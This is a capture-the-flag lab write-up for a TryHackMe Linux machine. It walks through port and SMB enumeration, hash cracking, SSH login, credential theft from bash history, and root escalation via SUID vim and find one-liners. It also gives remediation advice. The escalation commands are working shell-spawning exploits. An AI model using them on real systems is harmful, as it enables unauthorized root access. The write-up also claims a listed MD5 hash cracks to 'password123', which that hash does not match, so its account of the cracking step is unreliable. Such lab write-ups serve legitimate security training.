# Lab 01: Basic Linux Enumeration & Privilege Escalation

**Platform**: TryHackMe
**Machine**: Basic Pentesting
**Difficulty**: Easy
**Date**: December 2024
**Status**: ✅ Completed

## Summary

This lab focused on fundamental Linux enumeration techniques and basic privilege escalation. The machine had a web server, SSH service, and a vulnerable SUID binary that allowed escalation to root.

## Enumeration

### Port Scanning

```bash
# Initial scan
nmap -sC -sV -oN nmap/initial 10.10.x.x

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1
80/tcp    open  http    Apache httpd 2.4.29
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

### Web Enumeration

```bash
# Directory brute-force
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt

/index.html
/development/
```

Findings in `/development`:
- `dev.txt`: Contains potential usernames
- `j.txt`: Contains what looks like a hash

### SMB Enumeration

```bash
# Enumerate SMB shares
enum4linux -a 10.10.x.x

# Anonymous share found
smbclient //10.10.x.x/Anonymous -N

# Found file: staff.txt
get staff.txt
```

Contents revealed two usernames: `jan` and `kay`.

## Initial Access

### Credential Discovery

From the web enumeration, found a hash in `j.txt`:

```
jan:5f4dcc3b5aa765d61d8327deb882cf99
```

Used `hashcat` to crack:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Result: password = "password123"
```

### SSH Access

```bash
ssh jan@10.10.x.x
Password: password123

jan@basic-pentesting:~$
```

## Privilege Escalation

### Enumeration as jan

```bash
# Check sudo permissions
sudo -l
# No sudo permissions

# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Interesting findings:
/usr/bin/find
/usr/bin/vim.basic
```

### Lateral Movement to kay

Found kay's password in jan's home directory:

```bash
cat /home/jan/.bash_history
# Shows: ssh kay@localhost with password visible in history
```

### Root Privilege Escalation

As kay, checked for SUID binaries again and found `vim.basic`:

```bash
# Exploit vim SUID for privilege escalation
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Alternative method using find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Got root!
whoami
root
```

### Flags

```bash
# User flag
cat /home/kay/user.txt
THM{user_flag_here}

# Root flag
cat /root/root.txt
THM{root_flag_here}
```

## Key Learnings

### Technical Skills

1. **Enumeration is crucial**: Found critical information in multiple places
   - Web directories revealed usernames and hashes
   - SMB shares contained additional user information
   - Bash history exposed credentials

2. **SUID binary exploitation**:
   - Learned to identify SUID binaries
   - Used GTFOBins for exploitation techniques
   - Multiple paths to root (vim, find)

3. **Password cracking**:
   - Identified hash type (MD5)
   - Used hashcat effectively
   - Importance of weak passwords

### Methodology

```
1. Port Scan (nmap)
2. Service Enumeration (web, SMB)
3. Credential Discovery (hashes, passwords)
4. Initial Access (SSH)
5. Local Enumeration (SUID, sudo)
6. Privilege Escalation (SUID exploitation)
```

## Tools Used

- `nmap`: Port scanning
- `gobuster`: Web directory enumeration
- `enum4linux`: SMB enumeration
- `smbclient`: SMB file access
- `hashcat`: Password cracking
- `find`: SUID binary search
- GTFOBins: Exploitation reference

## Mistakes Made

1. **Initially missed .bash_history**: Should always check history files
2. **Didn't check all SUID binaries initially**: Learned to be more thorough
3. **Forgot to document some enumeration steps**: Need better note-taking discipline

## Remediation Recommendations

1. **Weak Passwords**: Implement strong password policy
2. **Sensitive Information Exposure**: Don't store passwords in bash history or web-accessible directories
3. **Excessive SUID Permissions**: Remove unnecessary SUID bits from binaries
4. **Anonymous SMB Access**: Disable anonymous access or restrict to non-sensitive files

## Time Breakdown

- Enumeration: 30 minutes
- Initial Access: 15 minutes
- Privilege Escalation: 20 minutes
- **Total**: ~1 hour 5 minutes

## Resources

- [GTFOBins - SUID Exploitation](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)

## Next Steps

- Practice more SUID exploitation techniques
- Build automation scripts for enumeration
- Study other privilege escalation vectors (kernel exploits, capabilities)

---

*Great beginner box for understanding the fundamentals. Reinforced the importance of thorough enumeration and checking for low-hanging fruit like bash history.*
